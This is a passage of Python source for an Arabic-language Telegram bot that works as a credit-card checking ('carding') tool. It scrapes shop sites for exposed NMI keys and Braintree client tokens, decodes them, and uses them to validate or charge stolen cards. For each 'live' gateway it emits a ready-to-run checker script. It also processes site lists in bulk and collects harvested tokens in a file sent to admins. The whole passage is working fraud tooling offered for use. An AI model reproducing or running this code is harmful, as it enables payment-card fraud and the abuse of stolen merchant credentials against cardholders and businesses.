            elif 'response=2' in response_text:
                reason = re.search(r'responsetext=([^&]+)', response_text)
                result_msg = f'❌ {reason.group(1) if reason else "CARD DECLINED"}'
            else: return None
            code = f'''# NMI Checker
import requests, time

class NMIChecker:
    def __init__(self):
        self.api_key = "{api_key.group(1)}"
        self.security_key = "{security_key.group(1) if security_key else ''}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        ccexp = f'{{mm}}{{yy[2:]}}'
        data = {{'type': 'sale', 'amount': '1.00', 'ccnumber': n, 'ccexp': ccexp, 'cvv': cvc, 'api_key': self.api_key}}
        if self.security_key: data['security_key'] = self.security_key
        r = requests.post('https://secure.networkmerchants.com/api/transact.php', data=data, timeout=20)
        text = r.text
        if 'response=1' in text: return '✅ CHARGED 1$'
        elif 'response=2' in text: return '❌ CARD DECLINED'
        else: return text[:100]

if __name__ == '__main__':
    c = NMIChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
            return {'status': 'LIVE', 'gateway': 'NMI', 'message': result_msg, 'tokens': tokens, 'code': code}
        return None
    except:
        return None
    finally:
        session.close()

# ==================== BRAINTREE ====================
def check_braintree_auth(url, auth, card_data):
    try:
        parts = card_data.strip().split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = '20' + yy
        headers = {'Authorization': f'Bearer {auth}', 'Content-Type': 'application/json', 'Braintree-Version': '2019-01-01', 'User-Agent': UA}
        pm_query = {'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { paymentMethod { id details { ... on CreditCardDetails { last4 bin cardType } } } } }', 'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': True}}}}
        r2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=pm_query, timeout=15)
        result = r2.json()
        
        tokens = {'Authorization': auth}
        
        if 'data' in result and 'tokenizeCreditCard' in result['data']:
            pm = result['data']['tokenizeCreditCard']['paymentMethod']
            details = pm.get('details', {})
            card_type = details.get('cardType', '')
            last4 = details.get('last4', '')
            result_msg = f'✅ CARD VALID | {card_type} | ...{last4}'
        else:
            errors = result.get('errors', [])
            if errors:
                result_msg = errors[0].get('message', 'DECLINED')
            else:
                result_msg = '❌ DECLINED'
        
        status = classify_error(result_msg)
        if status == 'LIVE':
            code = f'''# Braintree Checker
import requests, time

class BraintreeChecker:
    def __init__(self):
        self.auth = "{auth}"
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        n, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 2: yy = '20' + yy
        h = {{'Authorization': f'Bearer {{self.auth}}', 'Content-Type': 'application/json', 'Braintree-Version': '2019-01-01'}}
        q = {{'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{ tokenizeCreditCard(input: $input) {{ paymentMethod {{ id details {{ ... on CreditCardDetails {{ last4 cardType }} }} }} }} }}', 'variables': {{'input': {{'creditCard': {{'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}}, 'options': {{'validate': True}}}}}}}}
        r = requests.post('https://payments.braintree-api.com/graphql', headers=h, json=q, timeout=20)
        result = r.json()
        if 'data' in result:
            pm = result['data']['tokenizeCreditCard']['paymentMethod']
            d = pm.get('details', {{}})
            return f'✅ CARD VALID | {{d.get("cardType", "")}} | ...{{d.get("last4", "")}}'
        else:
            errors = result.get('errors', [])
            if errors:
                msg = errors[0].get('message', 'DECLINED')
                if 'insufficient' in msg.lower(): return '💰 INSUFFICIENT FUNDS'
                elif 'declined' in msg.lower(): return '❌ CARD DECLINED'
                else: return f'❌ {{msg[:60]}}'
        return '❌ DECLINED'

if __name__ == '__main__':
    c = BraintreeChecker()
    while True:
        ccx = input('Card: ')
        print(c.Charge(ccx))
'''
            return {'status': 'LIVE', 'gateway': 'Braintree', 'message': result_msg, 'tokens': tokens, 'code': code}
        return None
    except:
        return None

def check_braintree(url, card_data):
    session = requests.Session()
    session.verify = False
    try:
        urls_to_try = [f'{url}/my-account/add-payment-method/', f'{url}/add-payment-method/', f'{url}/payment-method/', url]
        html = None
        for try_url in urls_to_try:
            r = session.get(try_url, headers={'User-Agent': UA}, timeout=10)
            if r.status_code == 200:
                html = r.text
                break
        if not html: return None
        client_token_match = re.search(r'var wc_braintree_client_token[=:]\s*"([^"]+)"', html)
        if not client_token_match:
            client_token_match = re.search(r'"clientToken":"([^"]+)"', html)
        auth = None
        if client_token_match:
            client_token = client_token_match.group(1)
            try:
                padding = '=' * (4 - len(client_token) % 4)
                if padding == '====': padding = ''
                decoded = base64.b64decode(client_token + padding).decode('utf-8')
                auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                if auth_match: auth = auth_match.group(1)
            except: pass
        if not auth:
            token_key = re.search(r'tokenization[_\-]?key["\s:=]+["\s]*([a-zA-Z0-9_]+)', html, re.IGNORECASE)
            if token_key: auth = token_key.group(1)
            else: return None
        return check_braintree_auth(url, auth, card_data)
    except:
        return None
    finally:
        session.close()

# ==================== أوامر ====================
@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return
    user_id = message.from_user.id
    userr = message.from_user.first_name
    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>

<b>بوابات مدعومة:</b>
🅿️ PayPal Give WP >> /paypal
💳 Stripe Donation >> /stripe
🟦 Square >> /square
🟢 NMI >> /nmi
🟣 Braintree >> /braintree
📦 فحص ملف >> /bulk

[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr'''
    bot.send_message(message.chat.id, IU, parse_mode='HTML')

@bot.message_handler(commands=['paypal', 'stripe', 'square', 'nmi', 'braintree'])
def gateway_cmd(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return
    cmd = message.text.split()[0].replace('/', '').strip()
    lines = message.text.split('\n')
    if len(lines) < 2:
        bot.reply_to(message, f"<code>/{cmd} url\ncard</code>", parse_mode="HTML")
        return
    url = lines[0].replace(f'/{cmd}', '').strip()
    card = lines[1].strip() if len(lines) > 1 else '4059986126444431|11|30|947'
    if not url.startswith('http'): url = 'https://' + url
    ko = bot.reply_to(message, f"🔍 <b>جاري فحص {cmd}...</b>\n<code>{url}</code>", parse_mode="HTML")
    
    result = None
    if cmd == 'paypal': result = check_paypal(url, card)
    elif cmd == 'stripe': result = check_stripe(url, card)
    elif cmd == 'square': result = check_square(url, card)
    elif cmd == 'nmi': result = check_nmi(url, card)
    elif cmd == 'braintree': result = check_braintree(url, card)
    
    if result and result.get('status') == 'LIVE':
        send_gateway_code(message.chat.id, result['gateway'], url, result['message'], result.get('tokens'), result.get('code'))
        bot.delete_message(message.chat.id, ko.message_id)
    else:
        bot.edit_message_text("❌ <b>لا توجد بوابة حية</b>", message.chat.id, ko.message_id, parse_mode="HTML")

@bot.message_handler(commands=['bulk'])
def bulk_cmd(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return
    lines = message.text.split('\n')
    if len(lines) < 1:
        bot.reply_to(message, "<code>/bulk 4206120859214256|11|2027|982</code>", parse_mode="HTML")
        return
    card = lines[0].replace('/bulk', '').strip()
    if len(card.split('|')) != 4:
        bot.reply_to(message, "❌ صيغة الكارت", parse_mode="HTML")
        return
    user_sessions[message.from_user.id] = {'card_data': card, 'waiting_file': True}
    bot.reply_to(message, "📤 أرسل ملف .txt فيه المواقع")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        bot.reply_to(message, "❌ أرسل /bulk أولاً")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    try:
        sites = [s.strip() for s in downloaded.decode('utf-8').splitlines() if s.strip()]
    except:
        sites = [s.strip() for s in downloaded.decode('latin-1').splitlines() if s.strip()]
    if not sites:
        bot.reply_to(message, "❌ ملف فارغ")
        return
    card = user_sessions[user_id]['card_data']
    status_msg = bot.reply_to(message, f"🔍 <b>جاري فحص {len(sites)} موقع...</b>", parse_mode="HTML")
    task_id = f"{user_id}_{int(time.time())}"
    processing_status[task_id] = {'stop': False, 'found': 0}
    threading.Thread(target=process_bulk, args=(task_id, sites, card, message.chat.id, status_msg.message_id)).start()

def process_bulk(task_id, sites, card, chat_id, status_msg_id):
    found = 0
    for i, site in enumerate(sites, 1):
        if processing_status[task_id]['stop']: break
        if not site.startswith('http'): site = 'https://' + site
        result = check_paypal(site, card)
        if not result or result.get('status') != 'LIVE': result = check_stripe(site, card)
        if not result or result.get('status') != 'LIVE': result = check_square(site, card)
        if not result or result.get('status') != 'LIVE': result = check_nmi(site, card)
        if not result or result.get('status') != 'LIVE': result = check_braintree(site, card)
        if result and result.get('status') == 'LIVE':
            found += 1
            processing_status[task_id]['found'] = found
            send_gateway_code(chat_id, result['gateway'], site, result['message'], result.get('tokens'), result.get('code'))
        if i % 3 == 0 or i == len(sites):
            try:
                bot.edit_message_text(f"🔍 <b>{i}/{len(sites)}</b>\n🔥 <b>بوابات حية:</b> {found}", chat_id, status_msg_id, parse_mode="HTML")
            except: pass
        time.sleep(0.3)
    try:
        bot.edit_message_text(f"✅ <b>اكتمل!</b>\n🔥 <b>بوابات حية:</b> {found}/{len(sites)}", chat_id, status_msg_id, parse_mode="HTML")
    except: pass
    processing_status.pop(task_id, None)
    gc.collect()

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    user_id = message.from_user.id
    for task_id in list(processing_status.keys()):
        if task_id.startswith(str(user_id)):
            processing_status[task_id]['stop'] = True
    bot.reply_to(message, "⏹️ تم الإيقاف")

@bot.message_handler(commands=['tokens'])
def tokens_cmd(message):
    if message.from_user.id not in ADMINS:
        return
    try:
        with open('tokens.txt', 'r') as f:
            lines = f.read().splitlines()
        if not lines:
            bot.reply_to(message, "❌ لا توجد توكنات")
            return
        with open('tokens.txt', 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"🔑 <b>كل التوكنات ({len(lines)})</b>", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ خطأ")

print('✅ Bot is running...')
while True:
    try:
        bot.infinity_polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f'❌ Error: {e}')
        time.sleep(5)
